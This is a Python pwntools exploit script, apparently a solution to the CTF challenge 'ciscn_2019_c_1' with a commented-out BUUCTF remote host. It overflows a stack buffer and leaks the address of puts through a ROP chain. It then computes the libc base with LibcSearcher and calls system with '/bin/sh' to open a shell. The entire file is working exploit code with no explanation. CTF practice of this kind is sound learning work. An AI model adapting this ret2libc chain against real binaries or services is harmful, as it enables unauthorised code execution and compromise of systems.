from pwn import *
from LibcSearcher import *

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if isinstance(l[i], int):
            l[i] = chr(l[i]^0xF)
        elif l[i].isupper():
            l[i] = chr(ord(l[i])^0xE)
        elif l[i].islower():
            l[i] = chr(ord(l[i])^0xD)
    return ''.join(l)

sh = process("./ciscn_2019_c_1")
#sh = remote("node3.buuoj.cn", 27838)
elf = ELF("./ciscn_2019_c_1")

main_addr = 0x400B28
pop_rdi_ret = 0x400C83
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

sh.recv()
sh.sendline('1')
sh.recvuntil('encrypted\n')

payload = b'a' * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
#payload = encrypt(payload)
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('Ciphertext\n')
sh.recvuntil('\n')
puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
log.success('puts_addr = ' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase = ' + hex(libcbase))

sh.recv()
sh.sendline('1')
sh.recvuntil('encrypted\n')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')
ret = 0x4006b9
payload2 = b'a' * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
sh.sendline(payload2)

sh.interactive()

